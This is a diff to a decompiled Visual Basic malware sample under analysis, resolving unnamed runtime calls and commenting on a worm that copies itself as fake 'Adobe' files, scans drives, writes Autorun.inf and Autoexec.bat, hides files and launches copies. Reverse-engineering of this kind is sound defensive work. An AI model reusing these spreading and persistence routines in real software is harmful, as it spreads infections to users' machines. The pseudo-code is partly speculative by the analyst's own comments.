@@ -58,7 +58,7 @@ Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (By
 Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
 
 
-' TO DO: CHANGE DLL CALLINGS TO ThumbsDLL.XXX
+' TO DO: CHANGE DLL CALLINGS TOThumbsDLL.XXX
 
 Private Sub Timer1_Timer() '4034F4
   'Data Table: 401838
@@ -93,7 +93,7 @@ Public Function funct0() '405960
   loc_405793: var_98 = MemVar_407350.App
   loc_4057A3: var_AC = CVar(App.Path) 'String. Get the app path
 
-  loc_4057A9: Thumbs   .db.address_80000210 ' Call to the DLL
+  loc_4057A9: ThumbsDLL.rtcUpperCaseVar ' Call to the DLL
   loc_4057B1: var_CC = var_BC 'Variant
   loc_4057C3: var_AC = 0
   loc_4057C8: var_BC = funct1(var_AC)
@@ -101,23 +101,23 @@ Public Function funct0() '405960
   loc_4057DE:   funct0 = var_BC
   loc_4057E4: End If
   loc_4057EB: var_FC = "\" 'Variant
-  loc_4057FC: Thumbs   .db.address_8000026B
+  loc_4057FC: ThumbsDLL.rtcRightCharVar
   loc_40580C: If CBool(var_AC <> var_FC) Then
   loc_40581B:   var_CC = var_CC & var_FC 'Variant
   loc_40581F: End If
   loc_40582D: var_98 = MemVar_407350.App
   loc_40583D: var_AC = CVar(App.EXEName) 'String
-  loc_405843: Thumbs   .db.address_80000210
+  loc_405843: ThumbsDLL.rtcUpperCaseVar
   loc_40584B: var_10C = var_BC 'Variant
   loc_40585F: var_AC = "Thumbs"
-  loc_405868: Thumbs   .db.address_80000210
+  loc_405868: ThumbsDLL.rtcUpperCaseVar
   loc_405879: If (var_BC = var_BC) Then
   loc_405890:   var_AC = InStr(1, var_CC, ":", 0)
-  loc_40589C:   Thumbs   .db.address_80000269
+  loc_40589C:   ThumbsDLL.rtcLeftCharVar
   loc_4058A4:   var_11C = var_BC 'Variant
   loc_4058AE: Else
   loc_4058C1:   var_BC = (Len(var_10C) - 1)
-  loc_4058CD:   Thumbs   .db.address_80000269
+  loc_4058CD:   ThumbsDLL.rtcLeftCharVar
   loc_4058D9:   var_11C = var_EC & var_EC 'Variant
   loc_4058E0: End If
   loc_4058E7: var_AC = funct2()
@@ -137,15 +137,15 @@ Public Function funct1(a) '40389C
   loc_403813: If (option = 0) Then
   loc_40381F:   Proc_1_7_40529C(windir, "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders") ' windir is not set
   'Calls the DLL 2 times
-  loc_40382A:   Thumbs   .db.address_80000208
-  loc_403835:   Thumbs   .db.address_80000210
+  loc_40382A:   ThumbsDLL.rtcTrimVar
+  loc_403835:   ThumbsDLL.rtcUpperCaseVar
   loc_40383D:   a = var_E4 ' var_E4 is not set
 
   loc_40384A: Else
   loc_403855:   If (option = 1) Then
   loc_40385D:     windir = "windir"
                   'Calls the DLL, maybe with parameter windir
-  loc_403866:     Thumbs   .db.address_8000029A
+  loc_403866:     ThumbsDLL.rtcEnvironVar
   loc_403880:     a = dll_dir & "\" & "Thumbs   .db" ' dll_dir is not set
   loc_40388C:   End If
   loc_40388C: End If
@@ -166,7 +166,7 @@ Public Function funct2() '405BF8
   loc_4059F6: var_AC = CVar(App.EXEName) 'Variant
   loc_405A0B: var_98 = Me.Global.App
   loc_405A1B: var_BC = CVar(App.Path) 'String
-  loc_405A32: Thumbs   .db.address_8000026B
+  loc_405A32: ThumbsDLL.rtcRightCharVar
   loc_405A45: If CBool(var_BC <> "\") Then
   loc_405A56:   var_CC = var_BC & "\" 'Variant
   loc_405A5A: End If
@@ -177,24 +177,24 @@ Public Function funct2() '405BF8
   loc_405AED: var_15C = var_13C & "Adobe Online" & ".com" 'Variant
   loc_405AF9: var_160 = CStr(var_14C)
   loc_405B00: var_9C = CStr(var_FC)
-  loc_405B04: Thumbs   .db.address_80000240
+  loc_405B04: ThumbsDLL.rtcFileCopy
   loc_405B15: var_160 = CStr(var_15C)
   loc_405B1C: var_9C = CStr(var_FC)
-  loc_405B20: Thumbs   .db.address_80000240
+  loc_405B20: ThumbsDLL.rtcFileCopy
   loc_405B31: var_160 = CStr(var_14C)
   loc_405B38: var_9C = CStr(var_10C)
-  loc_405B3C: Thumbs   .db.address_80000240
+  loc_405B3C: ThumbsDLL.rtcFileCopy
   loc_405B4D: var_160 = CStr(var_15C)
   loc_405B54: var_9C = CStr(var_10C)
-  loc_405B58: Thumbs   .db.address_80000240
+  loc_405B58: ThumbsDLL.rtcFileCopy
   loc_405B76: var_160 = CStr(funct1(1))
   loc_405B86: var_9C = CStr(var_CC & "Thumbs   .db")
-  loc_405B8A: Thumbs   .db.address_80000240
+  loc_405B8A: ThumbsDLL.rtcFileCopy
   loc_405BB6: var_9C = CStr(funct1(1))
-  loc_405BBA: Thumbs   .db.address_80000244
-  loc_405BD3: Thumbs   .db.address_80000258
+  loc_405BBA: ThumbsDLL.rtcSetFileAttr
+  loc_405BD3: ThumbsDLL.rtcShell
   loc_405BD8: var_168 = var_14C
-  loc_405BE5: Thumbs   .db.address_80000258
+  loc_405BE5: ThumbsDLL.rtcShell
   loc_405BEF: funct2 = var_15C
 End Function
 
@@ -209,8 +209,8 @@ Public Function funct3(path) '404DDC
 
   loc_404C90: backslash = "\" 'Variant
   loc_404C96: ' Referenced from: 404DD1
-  loc_404C98: Thumbs   .db.address_80000256
-  loc_404CAA: Thumbs   .db.address_8000026B
+  loc_404C98: ThumbsDLL.rtcDoEvents
+  loc_404CAA: ThumbsDLL.rtcRightCharVar
 
   ' This portion of code needs further investigation.
   ' (If "\" not at the end, add it?)
@@ -282,26 +282,26 @@ Public Function funct4(a, b, c) '404C24
   Dim var_120 As Variant
   loc_404A82: On Error Goto loc_404C16
   loc_404A90: var_C4 = c And 16
-  loc_404AC4: If CBool(CStr(a) And (Thumbs   .db.address_80000268 <> ".")) Then
+  loc_404AC4: If CBool(CStr(a) And (ThumbsDLL.rtcLeftCharBstr <> ".")) Then
   loc_404ADA:   var_100 = Me.Global.App
   loc_404AE2:   App.HelpFile = CStr(a)
   loc_404AFF:   var_100 = Me.Global.App
   loc_404B16:   var_110 = b & CVar(App.HelpFile) 'Variant
-  loc_404B3B:   Thumbs   .db.address_80000210
+  loc_404B3B:   ThumbsDLL.rtcUpperCaseVar
   loc_404B59:   If CBool(InStr(var_110, var_120, var_120, 0)) Then
   loc_404B5C:     funct4 = funct1(0)
   loc_404B62:   End If
   loc_404B77:   var_140 = var_110 & " " & ".scr" 'Variant
-  loc_404B96:   If (Thumbs   .db.address_80000285 <> vbNullString) Then
+  loc_404B96:   If (ThumbsDLL.rtcDir <> vbNullString) Then
   loc_404B99:     funct4 = var_140
   loc_404B9F:   End If
   loc_404BA7:   var_D8 = CStr(var_110)
-  loc_404BAB:   Thumbs   .db.address_80000244
+  loc_404BAB:   ThumbsDLL.rtcSetFileAttr
   loc_404BC3:   var_DC = CStr(var_140)
   loc_404BE5:   var_D8 = CStr(funct1(0) & "\" & "Adobe update" & ".com")
-  loc_404BE9:   Thumbs   .db.address_80000240
+  loc_404BE9:   ThumbsDLL.rtcFileCopy
   loc_404C0A:   var_D8 = CStr(var_140)
-  loc_404C0E:   Thumbs   .db.address_80000244
+  loc_404C0E:   ThumbsDLL.rtcSetFileAttr
   loc_404C16:   ' Referenced from: 404A82
   loc_404C16: End If
   loc_404C16: funct4 = var_D8
@@ -375,10 +375,10 @@ Public Function funct6() '403B6C
   'Data Table: 401838
   Dim var_114 As Variant
   loc_403ACB: For var_F4 = 67 To 90: var_A4 = var_F4 'Variant
-  loc_403AD1:   Thumbs   .db.address_80000256
-  loc_403AE1:   Thumbs   .db.address_80000260
+  loc_403AD1:   ThumbsDLL.rtcDoEvents
+  loc_403AE1:   ThumbsDLL.rtcVarBstrFromAnsi
   loc_403B00:   If (var_114 > 0) Then
-  loc_403B0B:     Thumbs   .db.address_80000260
+  loc_403B0B:     ThumbsDLL.rtcVarBstrFromAnsi
   loc_403B25:     var_134 = funct7(var_104) & ":" & "\" 'Variant
   loc_403B36:     var_104 = funct3(var_134)
   loc_403B44:     var_104 = funct8(var_134)
@@ -395,7 +395,7 @@ Public Function funct7(a) '403EC8 ' Disk drive stuff?
   loc_403DEA: On Error Goto loc_403EBA ' Exit on error
   loc_403DED: ILdDarg ' Uncommon opcode
               'Call the DLL
-  loc_403DFC: Thumbs   .db.address_800002CC
+  loc_403DFC: ThumbsDLL.rtcCreateObject2
   loc_403E04: VarLateMemCallLdRfVar ' Another rarely used opcode
 
   ' Returns the storage drive type of the Drive object named drive. Ref: https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/drivetype-property
@@ -448,18 +448,18 @@ Public Function funct8(a) '4054C0
   loc_40531A: autorun_path = a & "Autorun.inf" 'Variant.
   loc_40532D: exe_path = a & exe_name 'Variant
 
-  loc_40534E: sus_data = Thumbs   .db.address_80000285 ' Gives this var the value of that address, but will be overwritten
+  loc_40534E: sus_data = ThumbsDLL.rtcDir ' Gives this var the value of that address, but will be overwritten
   
   ' Sets funct8 to 3 if the exe_path is set/valid (?) and the DLL is present
-  loc_405373: If (exe_path And (Thumbs   .db.address_80000285 <> vbNullString)) Then ' If the path of the EXE file and the value on the DLL file IS NOT NULL, then...
+  loc_405373: If (exe_path And (ThumbsDLL.rtcDir <> vbNullString)) Then ' If the path of the EXE file and the value on the DLL file IS NOT NULL, then...
   loc_405378:   funct8 = CLng(3) ' Set the return code to 3, but dont exit
   loc_40537E: End If
   
   loc_405388: sus_data = CStr(autorun_path)
 
   ' Calls 2 DLL functions
-  loc_40538C: Thumbs   .db.address_80000244
-  loc_405399: Thumbs   .db.address_80000211
+  loc_40538C: ThumbsDLL.rtcSetFileAttr
+  loc_405399: ThumbsDLL.rtcKillFiles
 
   ' Drops the autorun
   loc_4053AC: Open CStr(autorun_path) For Output As 1 Len = &HFF ' Set a buffer for the file (???)
@@ -476,10 +476,10 @@ Public Function funct8(a) '4054C0
   loc_40546D: sus_data = CStr(funct1(0) & "\" & "Adobe update" & ".com")
 
   ' Calls 2 different addresses 3 times in total. (maybe sus_data -> call args?)
-  loc_405471: Thumbs   .db.address_80000240
+  loc_405471: ThumbsDLL.rtcFileCopy
   loc_405494: sus_data = CStr(autorun_path)
-  loc_405498: Thumbs   .db.address_80000244
-  loc_4054AE: Thumbs   .db.address_80000244
+  loc_405498: ThumbsDLL.rtcSetFileAttr
+  loc_4054AE: ThumbsDLL.rtcSetFileAttr
   loc_4054B8: funct8 = CStr(exe_path) ' Return CStr(exe_path)
 End Function
 
@@ -501,18 +501,18 @@ Public Function funct9() '404A00 ' WARNING: The renamings made here are pure spe
   ' Examples: C:\Windows\System32 -> \Windows\System32
   '              C:\AppData\MyApp -> \AppData\MyApp
   loc_4048E2: splitted_path = InStr(1, dll_path, ":", 0) ' Split path
-  loc_4048EE: Thumbs   .db.address_80000269 ' Call the DLL
+  loc_4048EE: ThumbsDLL.rtcLeftCharVar ' Call the DLL
   loc_4048FF: autoexec_path = dll_path & "Autoexec.bat" 'Variant
 
   ' If CALL_RESULT NOT NULL -> return autoexec_path
-  loc_404924: If (Thumbs   .db.address_80000285 <> vbNullString) Then
+  loc_404924: If (ThumbsDLL.rtcDir <> vbNullString) Then
   loc_404929:   funct9 = autoexec_path
   loc_40492F: End If
 
   loc_404939: autoexec_path2 = CStr(autoexec_path)
               'Call 2 DLL functions
-  loc_40493D: Thumbs   .db.address_80000244
-  loc_40494A: Thumbs   .db.address_80000211
+  loc_40493D: ThumbsDLL.rtcSetFileAttr
+  loc_40494A: ThumbsDLL.rtcKillFiles
 
   ' Drop Autoexec.bat in the same folder as the DLL
   loc_40495D: Open CStr(autoexec_path) For Output As 1 Len = &HFF
@@ -542,9 +542,9 @@ Public Function funct10() '40417C
   loc_4040D1: var_118 = Me.Global.App
 
   loc_4040E1: original_name = CVar(App.EXEName) 'String
-  loc_4040E7: Thumbs   .db.address_80000210
+  loc_4040E7: ThumbsDLL.rtcUpperCaseVar
   loc_4040F4: copy1_name = "Adobe Online"
-  loc_4040FD: Thumbs   .db.address_80000210
+  loc_4040FD: ThumbsDLL.rtcUpperCaseVar
   
   ' Copy itself to the given path ?
   loc_404115: If (var_12C = var_12C) Then
@@ -553,14 +553,14 @@ Public Function funct10() '40417C
                 ' The files must be created and copied to the location,
                 ' so its probable that this 2 calls are responsible
                 ' for the file system operations
-  loc_404126:   Thumbs   .db.address_80000240
-  loc_40413A:   Thumbs   .db.address_80000258
+  loc_404126:   ThumbsDLL.rtcFileCopy
+  loc_40413A:   ThumbsDLL.rtcShell
   loc_40413F:   remaining_copy = au_path
   loc_404145: Else ' Do the same as above, but return different app paths
   loc_404148:   var_140 = CStr(ao_path)
   loc_40414F:   var_11C = CStr(au_path)
-  loc_404153:   Thumbs   .db.address_80000240
-  loc_404167:   Thumbs   .db.address_80000258
+  loc_404153:   ThumbsDLL.rtcFileCopy
+  loc_404167:   ThumbsDLL.rtcShell
   loc_40416C:   remaining_copy = ao_path
   loc_40416F: End If
 
@@ -576,15 +576,15 @@ Public Function funct11(a) '403C7C
   loc_403BC2: On Error Resume Next
   loc_403BD6: var_D4 = a & "Thumbs   .db" 'Variant
   loc_403BE4: var_E4 = 3 'Variant
-  loc_403C02: If (Thumbs   .db.address_80000285 <> vbNullString) Then
+  loc_403C02: If (ThumbsDLL.rtcDir <> vbNullString) Then
   loc_403C07:   funct11 = var_D4
   loc_403C0D: End If
   loc_403C17: var_E8 = CStr(var_D4)
-  loc_403C1B: Thumbs   .db.address_80000244
-  loc_403C28: Thumbs   .db.address_80000211
+  loc_403C1B: ThumbsDLL.rtcSetFileAttr
+  loc_403C28: ThumbsDLL.rtcKillFiles
   loc_403C3F: var_FC = CStr(var_D4)
   loc_403C46: var_E8 = CStr(funct1(1))
-  loc_403C4A: Thumbs   .db.address_80000240
-  loc_403C6B: Thumbs   .db.address_80000244
+  loc_403C4A: ThumbsDLL.rtcFileCopy
+  loc_403C6B: ThumbsDLL.rtcSetFileAttr
   loc_403C75: funct11 = CStr(var_D4)
 End Function
